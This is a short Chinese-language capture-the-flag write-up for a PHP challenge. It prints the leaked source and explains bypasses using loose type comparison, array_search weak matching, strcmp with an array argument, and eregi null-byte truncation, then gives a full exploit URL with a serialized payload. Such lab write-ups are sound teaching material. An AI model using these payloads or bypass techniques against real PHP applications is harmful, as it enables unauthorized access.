# php是最好的语言


## writeup

访问index.php.bak即可获取源码：
```php
<?php
$v1=0;$v2=0;$v3=0;
$a=(array)unserialize(@$_GET['foo']);
if(is_array($a)){
    is_numeric(@$a["param1"])?die("nope"):NULL;
    if(@$a["param1"]){
        ($a["param1"]>2017)?$v1=1:NULL;
    }
    if(is_array(@$a["param2"])){
        if(count($a["param2"])!==5 OR !is_array($a["param2"][0])) die("nope");
        $pos = array_search("nudt", $a["param2"]);
        $pos===false?die("nope"):NULL;
        foreach($a["param2"] as $key=>$val){
            $val==="nudt"?die("nope"):NULL;
        }
        $v2=1;
    }
}
$c=@$_GET['egg'];
$d=@$_GET['fish'];
if(@$c[1]){
    if(!strcmp($c[1],$d) && $c[1]!==$d){
        eregi("M|n|s",$d.$c[0])?die("nope"):NULL; 
        strpos(($c[0].$d), "MyAns")?$v3=1:NULL;
    }
}
if($v1 && $v2 && $v3){
    include "flag.php";
    echo $flag;
}

?>

```
其中
* param1处可以用php比较字符串与数字时的特性绕过：“2014xxxx”>"2011"
* param2处可以用array_search的弱比较特性绕过
* eregi存在00截断漏洞可绕过

总的payload为：

```url
index.php?foo=a:2:{s:6:"param1";s:6:"2019Tx";s:6:"param2";a:5:{i:0;a:1:{i:0;i:0;}i:1;i:1;i:2;i:2;i:3;i:3;i:4;i:0;}}&egg[1][]=1&fish=%00&egg[0]=sdasMyAns
```